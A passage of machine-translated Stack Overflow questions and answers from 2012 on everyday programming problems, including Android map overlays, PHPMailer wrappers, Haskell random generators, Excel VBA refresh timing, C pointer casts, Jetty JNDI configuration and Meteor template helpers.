因此，当我删除 getNameFrom 并对 Geopoint 进行硬编码时，我的地图会显示一个针点，但是，当我使用此函数时，它不会返回任何内容，因此我的地图不会显示任何内容。

这是我的 ItemizedOverlay 类：

```
public class ItemizedOverlay extends com.google.android.maps.ItemizedOverlay {

private ArrayList<OverlayItem> mOverlays = new ArrayList<OverlayItem>();

public ItemizedOverlay(Drawable defaultMarker) {
    super(boundCenterBottom(defaultMarker));

    // TODO Auto-generated constructor stub
}

@Override
public int size() {
    return mOverlays.size();
} 
public void addOverlay(OverlayItem overlay) {
    mOverlays.add(overlay);
    populate();
}
@Override
protected OverlayItem createItem(int i) {
  return mOverlays.get(i);
} 
```

}

这是我的代码，它将地址字符串转换为 lat 和 lng，然后进行叠加并添加它。

```
private  void convert_Points() throws IOException {
            // initialization
    mapOverlays = mapV.getOverlays();
    drawable = this.getResources().getDrawable(R.drawable.pin);
    itemizedoverlay = new ItemizedOverlay(drawable);

    // make OverlayItem by creating a GeoPoint that defines our map coordinates
    Geocoder geocoder = new Geocoder(this, Locale.getDefault());
    List<Address> geoResults = geocoder.getFromLocationName("empire state building", 1);
    while (geoResults.size()==0) {
        geoResults = geocoder.getFromLocationName("empire state building", 1);
    }
    if (geoResults.size()>0) {
    GeoPoint point= new GeoPoint( (int) (geoResults.get(0).getLatitude() * 1E6), (int) (geoResults.get(0).getLongitude() * 1E6));

//  GeoPoint point = new GeoPoint(19240000,-99120000);
    OverlayItem overlayitem = new OverlayItem(point, "", "");

//  add this OverlayItem to acollection in the ItemizedOverlay
    itemizedoverlay.addOverlay(overlayitem);
    mapOverlays.add(itemizedoverlay);

    }
} 
```

// 这是我的活动类中的 mapoverlay 类

```
class MapOverlay extends com.google.android.maps.Overlay
{
    @Override
    public boolean draw(Canvas canvas, MapView mapView, 
    boolean shadow, long when) 
    {
        super.draw(canvas, mapView, shadow);                   
        Point screenPts = new Point(); // transform the Geological point to map pixel
        mapView.getProjection().toPixels(p, screenPts);

        Bitmap bmp = BitmapFactory.decodeResource(  // add the pin
            getResources(), R.drawable.pin);            
        canvas.drawBitmap(bmp, screenPts.x, screenPts.y-50, null);         
        return true;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:49:57.317

```
mControl.animateTo(newp); 
```

在上面的行中 newp 可能为空。所以你必须处理所有预期的eceptions。

获得空指针异常的原因可能是您正在搜索某些内容，而地理编码器正在为您的搜索返回零值，或者在搜索时可能是任何连接问题。

关于如何添加叠加层，请参阅此[链接](https://stackoverflow.com/questions/9990209/cant-mark-while-showing-the-current-location-in-mapview/9990668#9990668)，它有一个关于如何将叠加层添加到地图的小而简单的解决方案。

# asp.net-mvc - 如何使用带有 json 的 mvc ef 创建记录？

> ID：10220461
> 
> 赞同：0
> 
> 时间：2012-04-19T01:33:16.433
> 
> 标签：asp.net-mvc, json, entity-framework

我知道如何从我的 MVC 应用程序中获取 json 格式的数据（见下文）

```
 public JsonResult Index()
    {
        return Json(db.Publications, JsonRequestBehavior.AllowGet);
    } 
```

创建方法会是什么样子？编辑？

我猜它看起来像下面这样

```
 [HttpPost]
    public void Create(Publication publication)
    {
        try
        {
            db.Publications.Add(publication);
            db.SaveChanges();
        }
        catch
        {
            // what do I catch?
        }
    } 
```

如果是这样，我的 JSON 调用会是什么样子？

（假设 Publication 类如下所示）

```
public class Publication
{
    public int Id { get; set; }
    public String Title { get; set; }
} 
```

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:55:13.033

对于索引，您可能会遇到一些异常，因为 EF 对象具有许多您在客户端不需要的属性，并且会引发循环引用异常。

您将不得不创建一个新的 POCO 类来“包装”存储库返回的实体，或者只使用此处建议的匿名对象：

[将实体框架对象序列化为 JSON](https://stackoverflow.com/questions/657939/serialize-entity-framework-objects-into-json)

IE：

```
return Json(db.Publications.Select(p => new {Id = p.Id, Title = p.Title}), JsonRequestBehavior.AllowGet); 
```

然后，来自客户端的使用 Json 的调用必须如下所示（假设您使用的是 JQuery）：

```
$.post('/controller/create', {id:$('#idField').val(), name:$('#nameField').val()}, function(){alert('Publication created');}); 
```

希望这可以帮助

# php - PHP Script 使用 1.3mb 内存，正常吗？

> ID：10220462
> 
> 赞同：1
> 
> 时间：2012-04-19T01:33:22.083
> 
> 标签：php

我用 memory_get_usage 和 memory_get_peak_usage 做了一些测试。

我的一个脚本返回 1.3mb 和另一个 1.47mb。

这是正常的？

我想知道什么时候需要护理？多少内存。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T02:31:41.740

```
it's normal? 
```

是的。它在上面 Tadeck 所述的范围内变化。

```
I would like to know when i need to care? how much memory. 
```

当然，当他们需要它时，您应该关心它。多少内存没有任何固定的答案，但是我确信仅通过代码中的细微变化，您的内存消耗不会下降太多。

您必须牢记，在时机成熟时，您可以进行可能的优化。您肯定可以做的一件事是，禁用 php.ini 中所有无用/未使用的模块。在我的本地开发盒上，我启用了大约 55 个 php 模块。

```
$ php -m | wc -l
55 
```

PHP 的工作原理是，对于每个请求，它将初始化 PHP 已配置的 55 个模块。每个模块在请求的生命周期中都有它的初始化、关闭、清理步骤，这既消耗时间又消耗内存。

如需进一步参考，您可以阅读这篇文章，其中解释了所有类型的内部细节，PHP 请求在浏览器上打印甚至是简单的“Hello World”之前都要经过这些细节。 [http://abhinavsingh.com/blog/2008/11/how-does-php-echos-a-hello-world-behind-the-scene/](http://abhinavsingh.com/blog/2008/11/how-does-php-echos-a-hello-world-behind-the-scene/)

# haskell - 如何在 haskell 中使用 newStdGen 或 getStdGen 而不是 mkStdGen

> ID：10220463
> 
> 赞同：5
> 
> 时间：2012-04-19T01:33:29.900
> 
> 标签：haskell, random

试图解决99 个 Haskell 问题中的第[23个问题。](http://www.haskell.org/haskellwiki/99_questions/21_to_28)

我写了这个

```
rnd_select :: (Eq a) => [a] -> Int -> [a]
rnd_select [] _ = []
rnd_select _ 0 = []
rnd_select ys n = 
   let 
       (rnd_index, gen) = randomR (1, length ys) (mkStdGen 200)
       (x, xs) = removeAt rnd_index ys
   in x : rnd_select xs (n-1) 
```

哪个有效，但我不想使用 mkStdGen 但使用

```
 newStdGen or getStdGen 
```

反而。我已经看到了问题的解决方案，但我想了解我应该如何修复这段代码来做到这一点，如果不可能，为什么不呢，因为直觉上感觉它应该可以工作，但事实并非如此。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-19T02:23:59.393

请记住，Haskell 函数是*纯*函数；给定相同的输入，它们必须始终返回相同的结果。你可以让你的函数返回`IO [a]`，这会让你调用`newStdGen`，但更好的方法是通过将随机数生成器作为函数的附加参数并在之后返回新的生成器来保持你的代码纯净：

```
rnd_select :: (Eq a, RandomGen g) => [a] -> Int -> g -> ([a], g)
rnd_select [] _ gen = ([], gen)
rnd_select _ 0  gen = ([], gen)
rnd_select ys n gen = 
   let (rnd_index, gen') = randomR (1, length ys) gen
       (x, xs) = removeAt rnd_index ys
       (xs', gen'') = rnd_select xs (n-1) gen'
   in (x : xs', gen'') 
```

现在您可以使用它，例如`getStdRandom :: (StdGen -> (a, StdGen)) -> IO a`像这样。

```
> getStdRandom (rnd_select [1..20] 10)
[12,11,14,4,16,7,1,2,18,15] 
```

不过，手动传递生成器可能有点乏味。使这个更整洁的一种方法是使用[MonadRandom](http://hackage.haskell.org/package/MonadRandom-0.4)包。

```
rnd_select :: (MonadRandom m, Eq a) => [a] -> Int -> m [a]
rnd_select [] _ = return []
rnd_select _ 0  = return []
rnd_select ys n = do
  rnd_index <- getRandomR (1, length ys)
  let (x, xs) = removeAt rnd_index ys
  xs' <- rnd_select xs (n-1)
  return (x:xs') 
```

由于`IO`是 的实例`MonadRandom`，因此您可以直接将其用作`IO`操作。

```
> rnd_select [1..20] 10
[20,18,12,13,5,7,17,9,3,4]
> rnd_select [1..20] 10
[9,18,4,20,6,5,3,15,13,7] 
```

或者您可以使用`evalRand`在纯 monad 中运行它，提供您自己的随机数生成器，以便您可以获得可重复的结果（适合调试/测试）。

```
> evalRand (rnd_select [1..20] 10) (mkStdGen 200)
[4,16,15,13,8,20,6,14,5,3]
> evalRand (rnd_select [1..20] 10) (mkStdGen 200)
[4,16,15,13,8,20,6,14,5,3] 
```

# php - 有没有比我的更简洁的方法，用 PHPMailer 发送邮件？

> ID：10220464
> 
> 赞同：0
> 
> 时间：2012-04-19T01:33:42.760
> 
> 标签：php, email, phpmailer

我正在使用 PHPMailer，但我认为它占用了太多行并且觉得我可以使它更简洁。下面的一些参数是多余的，因为所有内容都将从同一个电子邮件地址发送。

我实际上是在问我是否可以将始终相同的参数放在其他地方（From、FromName、Username、Password、Host、Post、SMTPSecure、SMTPAuth）

我该怎么做？提前致谢。问候

我的代码是：

```
include("classes/phpmailer/class.phpmailer.php");
include("classes/phpmailer/class.smtp.php"); // note, this is optional 

$mail             = new PHPMailer();
$body             = 'This is the body';

$mail->IsSMTP();
$mail->SMTPAuth   = true;                  // enable SMTP authentication
$mail->SMTPSecure = "ssl";                 // sets the prefix to the servier
$mail->Host       = "smtp.gmail.com";      // sets GMAIL as the SMTP server
$mail->Port       = 465;                   // set the SMTP port

$mail->Username   = "myemailaddress@gmail.com";  // GMAIL username
$mail->Password   = "mypassword";            // GMAIL password

$mail->From       = "myemailaddress@gmail.com";
$mail->FromName   = "Admin";
$mail->Subject    = "Welcome";
$mail->AltBody    = 'This is the body'; //Text Body
$mail->WordWrap   = 100; // set word wrap

$mail->MsgHTML($body);
$mail->AddReplyTo("replyto@yourdomain.com","Admin");
$mail->SMTPDebug = 1;
$mail->AddAddress($email,$firstname." ".$surname);

$mail->IsHTML(true); // send as HTML

if(!$mail->Send()) {
  echo "Mailer Error: " . $mail->ErrorInfo;
} else {
// nothing is displayed
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:36:53.067

为 phpmailer 类创建一个包装类，该类初始化所有默认值并仅设置更改的值。

我在我的 Kohana 开发站点中使用了以下类：

```
<?php
/**
 * @Author Mārtiņš Briedis
 * @Date: 2011-12-11
 */

class Mail{
    /**
     * Get an instance of PHPMailer
     * @static
     * @return PHPMailer
     */
    public static function factory(){
        $inst = new PHPMailer(true);

        // Initialize defaults
        $conf = array(..); // Array with configuration data
        $inst->SetFrom($conf['from_mail'], $conf['from_name']);
        $inst->AddReplyTo($conf['from_mail'], $conf['from_name']);
        $inst->Subject = $conf['subject'];

        // If development environment, use GMAIL smtp server
        $inst->IsSMTP(); // telling the class to use SMTP
        $inst->Host = "smtp@gmail.com"; // SMTP server
        $inst->SMTPAuth = true; // enable SMTP authentication
        $inst->SMTPSecure = "ssl"; // sets the prefix to the servier
        $inst->Host = "smtp.gmail.com"; // sets GMAIL as the SMTP server
        $inst->Port = 465; // set the SMTP port for the GMAIL server
        $inst->Username = $conf['mail']; // GMAIL username
        $inst->Password = $conf['password']; // GMAIL password

        return $inst;
    }

    /**
     * To get an instance, one should use factory method, not constructor
     */
    public function __construct(){
        throw new Exception('To get an instance, use static factory() method!');
    }
} 
```

然后只需使用：

```
$mail = Mail::factory();
$mail->AddAddress($user->mail, $user->full_name);
$mail->Subject = "New password";
$mail->Send(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T02:04:17.973

```
function New_Mail($body, $subject, $altBody, $wordwrap)
{
    $mail             = new PHPMailer();

    $mail->IsSMTP();
    $mail->SMTPAuth   = true;                  // enable SMTP authentication
    $mail->SMTPSecure = "ssl";                 // sets the prefix to the servier
    $mail->Host       = "smtp.gmail.com";      // sets GMAIL as the SMTP server
    $mail->Port       = 465;                   // set the SMTP port

    $mail->Username   = "myemailaddress@gmail.com";  // GMAIL username
    $mail->Password   = "mypassword";            // GMAIL password

    $mail->From       = "myemailaddress@gmail.com";
    $mail->FromName   = "Admin";
    $mail->Subject    = $subject;
    $mail->AltBody    = $altBody; //Text Body
    $mail->WordWrap   = $wordwrap; // set word wrap

    $mail->MsgHTML($body);
    $mail->AddReplyTo("replyto@yourdomain.com","Admin");
    $mail->SMTPDebug = 1;
    $mail->IsHTML(true); // send as HTML

    return $mail;
}

$mail = New_Mail("this is the body", "Welcome", "Another body", 100);
if(!$mail->Send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
} else {
// nothing is displayed
} 
```

现在您重用该功能。

# php - AJAX JSON 锁定浏览器

> ID：10220465
> 
> 赞同：0
> 
> 时间：2012-04-19T01:33:54.937
> 
> 标签：php, json, google-chrome, browser, locking

**服务器端 PHP 脚本**

```
echo " ";
while(connection_aborted()==0) {
    sleep(10);
} 
```

**客户端 JQuery 代码（工作正常）**

```
$.post("/url/to/server", some_data, function (d) {
    console.log(d);
}) 
```

**客户端 JQuery 代码（导致问题）**

```
$.post("/url/to/server", some_data, function (d) {
    console.log($.parseJSON(d));
}) 
```

当我运行第一个 JQuery 代码并刷新浏览器时，一切都按预期工作（浏览器重新加载）。当运行第二个 JQuery 代码（注意 parseJSON）并尝试刷新浏览器时，浏览器被锁定（Chrome），它永远不会重新加载。jquery 帖子导致了这个锁，但我不明白为什么？为什么回调函数中的parseJSON会导致浏览器锁定。有什么解决方法吗？

仅供参考：上面的代码只是我实际编码的一个小版本，在我的真实代码中，我从服务器端传递真实的 JSON 数据，并使用 JQuery 处理它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:40:08.223

试试看

```
$.post("/url/to/server", some_data, function (d) {
    console.log(d);
}, "json"); 
```

如果它仍然无法正常工作，我们需要您的 JSON 样本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:41:05.767

似乎没有任何正当理由`$.parseJSON`永远阻止/锁定您的浏览器。`"d"`您收到的变量到底是什么？它的大小是多少？

您还必须前往：

```
Chrome --> Right click --> Inspect element --> 
Profiles --> Collect Javascript CPU Profile 
```

检查并查看浏览器端到底出了什么问题。

# ruby-on-rails - 用于私人消息传递的 Rails 表单

> ID：10220467
> 
> 赞同：1
> 
> 时间：2012-04-19T01:34:15.857
> 
> 标签：ruby-on-rails, nested-attributes

我正在尝试在我的应用程序上创建两个用户之间的私人消息传递功能，但我在这里遇到了麻烦

首先，这里是 Schema.rb

```
create_table "conversations", :force => true do |t|
    t.string   "conversation_subject
end

create_table "messages", :force => true do |t|
    t.string   "content"
    t.integer  "user_id"
    t.integer  "conversation_id"
end

create_table "participants", :force => true do |t|
    t.integer  "conversation_id"
    t.integer  "user_id"
end

conversations has_many :messages, :participants
        users has_many :messages, :participants 
```

开始对话的表格：

```
<%= form_for @conversation do |f| %>

    <div class="field">
    <strong>Subject</strong><br />
    <%= f.text_field :conversation_subject %>

    </div>
    <div class="actions">
<%= f.submit "Submit" %>
    </div>
 <% end %> 
```

在上面的表格中，我想要

```
<%=f.text_area :content %> 
```

也适用于消息，以便一键创建对话和消息，但由于 user_id，我无法在此处使用嵌套属性（也许
你可以？但据我了解你不能）

1.  有没有办法在一个表单上处理来自两个不同模型的属性而不使用嵌套属性？

**注意**我知道 user_id 可以从 Message 中取出，并且理论上仍然具有功能性消息传递系统，但我认为为了将每条消息与发件人相关联，有必要将其包含在内

1.  我可能想到的唯一解决方法是 add_content_to_conversation 并在第一次创建 Conversation 时将其传递给 Message 。这就是我能想到的这个数据库设计。这是天生的缺陷吗？

任何帮助都会很棒。我是一名铁路初学者。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T02:09:48.770

I'm having trouble following along (Long day) but does this help?

**Messages**

```
belongs_to :recipient, :classname => 'User'
belongs_to :sender, :classname => 'User'

create_table "messages", :force => true do |t|
    t.string   "content"
    t.integer  "recipient_id"
    t.integer  "sender_id"
    t.integer  "conversation_id"
end 
```

# excel - 让 Excel VBA 在继续之前等待外部工作簿链接刷新

> ID：10220468
> 
> 赞同：3
> 
> 时间：2012-04-19T01:34:19.793
> 
> 标签：excel, vba

我有一个做两件事的工作表。

首先，它从 SQL 服务器更新 ODBC 数据表，然后更新其中一个数据表以包含公式以及对另一个 Excel 电子表格的引用。

其次，它会刷新基于上述更新表中的数据的数据透视表。

但是，它会在完成刷新源表中的数据之前更新数据透视表，从而导致源表之间的数据不一致（即使数据透视表正在重建，也会刷新）。有没有办法让 VBA 在继续之前等待外部链接的完全刷新？

这是我的代码：

```
Sub Update_All()

Application.ScreenUpdating = False

Application.Calculation = xlCalculationManual
ODBC_Tables_Update
UpdateReqTable
' force a calculation of the table due to insert of formula and lookup in the campaign plan
With Application
    .CalculateFull
    .Calculation = xlCalculationAutomatic
End With
'update pivot after calculation is done
OverviewUpdatePivot

Application.ScreenUpdating = True

End Sub

Private Sub ODBC_Tables_Update()

With ActiveWorkbook
    .Connections("Pallet Requirement").Refresh
    .Connections("Pallets on Stock").Refresh
End With

End Sub

Private Sub OverviewUpdatePivot()

With Sheets("Overview").PivotTables("pvt_PalletOverview")
    .PivotCache.Refresh
    .PivotFields("Start Date").AutoSort xlAscending, "Start Date"
    .PivotFields("PALLETITEM").AutoSort xlAscending, "PALLETITEM"
    .PivotFields("Start Date").ShowDetail = False
End With

End Sub

Private Sub UpdateReqTable()

' general variables
Dim cpPath$ 'Campaign Plan Path
Dim cpName$ 'Campaign Plan File Name
Dim cpL93$ 'Sheet 93 name
Dim cpL94$ 'Sheet 94 name
Dim cpL96$ 'Sheet 96 name
Dim ListNoCol$ 'Column Letter of List Numbers
Dim StartDateCol$ 'Column Letter of "Start Date"
Dim tblMatchPart$ 'JOBLIST field of table

' below index building part strings defined
Dim cpL93ListNoRange$
Dim cpL94ListNoRange$
Dim cpL96ListNoRange$
Dim cpL93DateRange$
Dim cpL94DateRange$
Dim cpL96DateRange$
Dim L93MatchFormulaPart$
Dim L93IndexFormula$
Dim L94MatchFormulaPart$
Dim L94IndexFormula$
Dim L96MatchFormulaPart$
Dim L96IndexFormula$

' Fill in values from the sheet into variables
cpPath = Range("cpPath")
cpName = Range("cpName")
cpL93 = Range("cpSheetL93")
cpL94 = Range("cpSheetL94")
cpL96 = Range("cpSheetL96")
ListNoCol = "$" & Range("cpListNoCol") & "1" & ":" & "$" & Range("cpListNoCol") & "64000"
StartDateCol = "$" & Range("cpStartDateCol") & "1" & ":" & "$" & Range("cpStartDateCol") & "64000"
tblMatchPart = "tbl_PalletReq[@JOBLIST]"

' Build the range expressions used in the MATCH and INDEX formula
cpL93ListNoRange = "'" & cpPath & "[" & cpName & "]" & cpL93 & "'!" & ListNoCol
cpL93DateRange = "'" & cpPath & "[" & cpName & "]" & cpL93 & "'!" & StartDateCol
cpL94ListNoRange = "'" & cpPath & "[" & cpName & "]" & cpL94 & "'!" & ListNoCol
cpL94DateRange = "'" & cpPath & "[" & cpName & "]" & cpL94 & "'!" & StartDateCol
cpL96ListNoRange = "'" & cpPath & "[" & cpName & "]" & cpL96 & "'!" & ListNoCol
cpL96DateRange = "'" & cpPath & "[" & cpName & "]" & cpL96 & "'!" & StartDateCol

' Build the INDEX formulas required
L93MatchFormulaPart = "MATCH(" & tblMatchPart & "," & cpL93ListNoRange & ",0)"
L93IndexFormula$ = "INDEX(" & cpL93DateRange & "," & L93MatchFormulaPart & ",0)"
L94MatchFormulaPart = "MATCH(" & tblMatchPart & "," & cpL94ListNoRange & ",0)"
L94IndexFormula$ = "INDEX(" & cpL94DateRange & "," & L94MatchFormulaPart & ",0)"
L96MatchFormulaPart = "MATCH(" & tblMatchPart & "," & cpL96ListNoRange & ",0)"
L96IndexFormula$ = "INDEX(" & cpL96DateRange & "," & L96MatchFormulaPart & ",0)"

'Insert Formulas into table tbl_PalletReq and format the formulas
With Range("tbl_PalletReq[L93 Date]")
    .Formula = "=" & L93IndexFormula
    .NumberFormat = "ddd-dd-mm-yyyy"
End With
With Range("tbl_PalletReq[L94 Date]")
    .Formula = "=" & L94IndexFormula
    .NumberFormat = "ddd-dd-mm-yyyy"
End With
With Range("tbl_PalletReq[L96 Date]")
    .Formula = "=" & L96IndexFormula
    .NumberFormat = "ddd-dd-mm-yyyy"
End With
With Range("tbl_PalletReq[Start Datetime]")
    .Formula = "=IFERROR([@[L93 Date]],IFERROR([@[L94 Date]],IFERROR([@[L96 Date]],"""")))"
    .NumberFormat = "ddd-dd-mm-yyyy hh:mm"
End With
With Range("tbl_PalletReq[Start Date]")
    .Formula = "=DATE(YEAR([@[Start Datetime]]),MONTH([@[Start Datetime]]),DAY([@[Start Datetime]]))"
    .NumberFormat = "ddd-dd-mm-yyyy"
End With
With Range("tbl_PalletReq[Est. Pallets]")
    .Formula = "=ROUNDUP(-[PROD.TONS]*1000/VLOOKUP([@PALLETITEM],tbl_PalletData,2,FALSE),0)"
    .NumberFormat = "#,##0"
End With

End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:11:21.627

You need to check your connections properties and disable the "Enable Background Refresh" option.

Or set the backgroundquery property to false in your code.

This should force excel to wait for the query to finish before continuing.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-25T15:40:52.423

我有这个问题；Readify 的回答很到位。这是我的代码。

```
 Range("Table_sqlserver_database[[#Headers],[column_name]]").Select
    With Selection.ListObject.QueryTable
        .BackgroundQuery = False
    End With 
```

# facebook-graph-api - 使用用户生成的照片的操作没有显示很大

> ID：10220469
> 
> 赞同：1
> 
> 时间：2012-04-19T01:34:28.947
> 
> 标签：facebook-graph-api, photo, facebook-opengraph, user-generated-content

我们正在使用开放图形操作来发布我们的应用程序制作的照片。即使我们包括：

`image[0][user_generated]=true`,

该图像不会在用户时间轴中显示为大照片。它只是在最近的活动框中。图像大于 520x520 像素（如[本](https://developers.facebook.com/docs/opengraph/usergeneratedphotos/)文档中所述）。

有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-26T16:49:01.633

也可以使用 JSON：

```
{"recept":"http://my.recept.com","image:url":"http://my.recept.com/my-recept.png","image:user_generated":true} 
```

截至目前，应用程序的开发人员不需要批准。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-12T17:13:49.793

确保您还指定 image[0][url]=url 否则它不会显示

# c - 在C中的函数中将指针作为数组传递？

> ID：10220473
> 
> 赞同：4
> 
> 时间：2012-04-19T01:34:41.367
> 
> 标签：c, arrays, pointers

```
void f(int *a, int n)
{
     int i;
     for (i = 0; i < n; i++)
     {
         printf("%d\n", *(a+i));
     }
 } 
```

`main()`如果我打电话，上面的代码可以正常工作：

```
int a[] = {1,2,3};
int *p = a;

f(a, 3); 
```

但如果在`main()`，我做了：

```
int *a =(int*) {1,2,3};

f(a, 3); 
```

然后，程序将崩溃。我知道这可能看起来很奇怪，但我正在学习并想知道其中的区别。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-19T01:38:49.997

是因为演员阵容。这条线说：

```
int *a =(int*) {1,2,3}; 
```

将数组`{1,2,3}`视为指向 int 的指针。在 32 位机器上，指针的值为 now `1`，这不是您想要的。

但是，当您这样做时：

```
int *p = a; 
```

编译器知道它可以将数组名称衰减为指向它的第一个元素的指针。就像你实际上写的那样：

```
int *p = &(a[0]); 
```

同样，您可以直接传递`a`给函数，因为当用作函数参数时，编译器也会将数组名称衰减为指针：

```
int a[] = {1,2,3};
int *p = &(a[0]);

f(p, 3) 
f(a, 3); // these two are equivalent 
```

# jetty - 码头jndi数据源问题

> ID：10220480
> 
> 赞同：1
> 
> 时间：2012-04-19T01:35:13.773
> 
> 标签：jetty, datasource, jndi, maven-jetty-plugin

简单的说。我想要一个可用于带有连接池的 webapp 的 oracle jndi 数据源。我想 maven 安装该项目，然后手动将其部署到 jetty hightide 7.xx 服务器并运行。我将 jetty-env 文件放在 WEB-INF 文件夹中，如下所示。

### 码头-env.xml

```
<!DOCTYPE Configure PUBLIC "-//Mort Bay Consulting//DTD Configure//EN"
   "http://jetty.mortbay.org/configure.dtd">
<Configure id="thisfile" class="org.eclipse.jetty.webapp.WebAppContext">
  <New class="org.eclipse.jetty.plus.jndi.Resource">
    <Arg></Arg>
    <Arg>jdbc/jndimyds</Arg>
    <Arg>
     <New class="oracle.jdbc.pool.OracleDataSource">
    <Set name="DriverType">thin</Set>
    <Set name="URL">jdbc:oracle:thin:@localhost:1521:xe</Set>
    <Set name="User">username</Set>
    <Set name="Password">password</Set>
    <Set name="connectionCachingEnabled">true</Set>
    <Set name="connectionCacheProperties">
        <New class="java.util.Properties">
            <Call name="setProperty">
                <Arg>MinLimit</Arg>
                <Arg>5</Arg>
            </Call>
            <!-- put the other properties in here too -->
        </New>
    </Set>

</New>
    </Arg>
</New>
</Configure> 
```

### 数据源bean

这是我的数据源 bean..

```
<bean id="dataSource" class="org.springframework.jndi.JndiObjectFactoryBean">
        <property name="jndiName" >
            <value>java:comp/env/jdbc/jndimyds</value>
        </property> 
        <property name="lookupOnStartup" value="false" />
        <property name="cache" value="true" />
        <property name="proxyInterface" value="javax.sql.DataSource" />
    </bean> 
```

Maven 安装很好，但是当我部署到码头服务器并启动它时，我收到以下错误。

```
2012-04-19 00:42:18.962:WARN::Failed startup of context o.e.j.w.WebAppContext{/myapp,file:/C:/Users/tharinduv/AppData/Local/Temp/jetty-0.0.0.0-2080-myapp.war-_myapp-any-/webapp/},C:\jetty\webapps\myapp.war
java.lang.IllegalArgumentException: Object is not of type class org.eclipse.jetty.webapp.WebAppContext
        at org.eclipse.jetty.xml.XmlConfiguration.configure(XmlConfiguration.java:203)
        at org.eclipse.jetty.plus.webapp.EnvConfiguration.configure(EnvConfiguration.java:118)
        at org.eclipse.jetty.webapp.WebAppContext.configure(WebAppContext.java:414)
        at org.eclipse.jetty.webapp.WebAppContext.startContext(WebAppContext.jav
a:1153)
        at org.eclipse.jetty.server.handler.ContextHandler.doStart(ContextHandler.java:588)
        at org.eclipse.jetty.webapp.WebAppContext.doStart(WebAppContext.java:436)
        at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLife
Cycle.java:55)
        at org.eclipse.jetty.deploy.bindings.StandardStarter.processBinding(StandardStarter.java:36)
        at org.eclipse.jetty.deploy.AppLifeCycle.runBindings(AppLifeCycle.java:180)
        at org.eclipse.jetty.deploy.DeploymentManager.requestAppGoal(DeploymentManager.java:479)
        at org.eclipse.jetty.deploy.DeploymentManager.addApp(DeploymentManager.java:136)
        at org.eclipse.jetty.deploy.providers.ScanningAppProvider.fileAdded(ScanningAppProvider.java:137)
        at org.eclipse.jetty.deploy.providers.ScanningAppProvider$1.fileAdded(ScanningAppProvider.java:50) 
```

我已经在 jetty-plus.xml 和 start.ini 中进行了必要的更改。有什么我想在 pom 文件中添加的吗？大多数帖子都建议使用 maven-jetty-plugin 但这只有在你使用 jetty-run 命令时才好？请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T09:44:39.750

我的一位朋友整理出问题是存在一些码头依赖关系，例如jetty-jsp，jetty-all-server。当排除它们并从 libs 文件夹中删除这些 jar 时，此错误不再存在。

# mongodb - 如何使用 PhantomJS 连接到 MongoDB

> ID：10220487
> 
> 赞同：4
> 
> 时间：2012-04-19T01:35:44.033
> 
> 标签：mongodb, phantomjs

我正在运行 OSX。以为我可以在某处找到文档，但找不到。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T15:51:50.983

您*可以*使用 MongoDB REST 客户端：

*   [Sleepy.Mangoose](https://github.com/10gen-labs/sleepy.mongoose "瞌睡猫鼬")：这是最好的 IMO

*   [MongoDB REST](https://github.com/tdegrunt/mongodb-rest "MongoDB 休息")：它看起来很有希望，但还不完整，并且有一些奇怪的错误（例如，它拒绝发送大请求（超过 80,000 个字符），我花了 3 个小时才发现它有什么问题）

*   [MongoDB Java REST 服务器](https://sites.google.com/site/mongodbjavarestserver/home "MongoDB Java REST 服务器")

您可以从注入的 javascript 直接连接到其余服务器（使用 jQuery 的`ajax`方法或简单地使用`xmlhttprequest`），但我认为最好在 PhantomJS 的`evaluate`方法中进行（因为如果您正在解析的页面有 javascript 错误，您注入的 javascript 可能不能正常工作）。

* * *

但我个人不喜欢 PhantomJS 的 REST 服务器的想法。我认为最好用[NodeJS](http://nodejs.org)编写整个应用程序并使用[`phantomjs`](https://github.com/sgentle/phantomjs-node)模块来运行 PhantomJS。这样，您不必采用 REST 方式，并且可以使用（现在正式的）[MongoDB Native Node Driver](https://github.com/mongodb/node-mongodb-native)，它可能比 REST 服务器快很多倍（因为它不需要 JSON HTTP 序列化/反序列化，其中其他事情）。

# meteor - 在 Meteor 中的模板之间共享功能

> ID：10220488
> 
> 赞同：15
> 
> 时间：2012-04-19T01:36:08.853
> 
> 标签：meteor

如果我有两个车把模板想要检查同一个函数的返回值怎么办？有正确的方法吗？显然我可以这样做：

```
var say_foo = function() {
  alert('foo');
};

Template.foo.say_foo = say_foo;
Template.bar.say_foo = say_foo; 
```

但是有没有办法直接通过 Template 对象来做到这一点？由于这是 JavaScript，我可以将函数分配给任何对象的任何属性，但我尝试这样做：

```
Template.say_foo = function() { alert('foo'); }; 
```

当然模板没有找到这个功能。

只是对最佳实践等感到好奇。谢谢！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-19T20:41:40.587

我认为更好的版本是（如果您使用默认设置的把手）：

```
Template.registerHelper('my_helper', function() {
     // code
}); 
```

您可以使用 {{my_helper}} 从任何模板调用它！

希望能帮助到你 ：）

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2014-08-24T06:22:27.167

~~根据 Meteor 文档，正确的方法是使用 UI 命名空间，它将绑定到下面使用的任何模板引擎，而不是直接使用 Handlebars 或空格键。这是文档中的链接。[http://docs.meteor.com/#ui_registerhelper](http://docs.meteor.com/#ui_registerhelper)~~

因此，要从 client.js 中使用的任何模板访问通用函数：

```
UI.registerHelper('stub', function() {
     // code
}); 
```

 ~~### 更新：

